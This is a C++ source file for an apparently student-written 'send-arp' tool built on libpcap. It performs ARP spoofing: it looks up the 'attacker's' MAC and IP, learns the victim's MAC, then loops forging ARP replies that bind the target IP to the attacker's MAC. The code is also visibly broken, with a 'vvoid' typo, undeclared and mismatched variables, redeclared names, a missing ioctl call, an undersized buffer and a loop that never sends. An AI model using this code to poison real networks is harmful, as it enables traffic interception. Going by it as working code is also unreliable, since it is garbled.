#include <cstdio>
#include <pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

vvoid usage() {
    printf("syntax : send-arp <interface> <target ip> <victim ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

char* getAtkMac(char *interface){
    struct ifreq ifr;
    int skt;
    unsigned char *tmp;
    char *atkMac = (char *)malloc(sizeof(char)*6);

    skt = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    tmp = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(atkMac, "%02x:%02x:%02x:%02x:%02x:%02x",tmp[0],tmp[1],tmp[2],tmp[3],tmp[4],tmp[5]); // save mac addr
    printf("Attacker's MAC addr. is %s\n", atkMac);
    return atkMac;
}

char* getAtkIp(char *interface){
    struct ifreq ifr;
    char *atkIp = (char*)malloc(sizeof(char)*40);
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Interface Error");
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, atkIp,sizeof(struct sockaddr));
    printf("Attacker's IP addr. is %s\n", atkIp);
    return atkIp;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	atkMac = getAtkMac(dev);
	atkIp = getAtkIp(dev);
	tgIP = argv[2];
	vtIp = argv[3];
	
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(atkMac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(atkMac);
	packet.arp_.sip_ = htonl(Ip(atkIP));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip("0.0.0.0"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	struct pcap_pkthdr* header;
   	const u_char* packet;
   	int res = pcap_next_ex(handle, &header, &packet);
     	EthArpPacket* packet = (EthArpPacket*)packet;
     	vtmMac = packet -> arp_.smac_;		 
	
	while(1){
		packet.eth_.dmac_ = Mac(vtMac);
		packet.eth_.smac_ = Mac(atkMac);
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(atkMac);
		packet.arp_.sip_ = htonl(Ip(tgIp));
		packet.arp_.tmac_ = Mac(atkMac);
		packet.arp_.tip_ = htonl(Ip(tgIp));
		
	}

	pcap_close(handle);
}

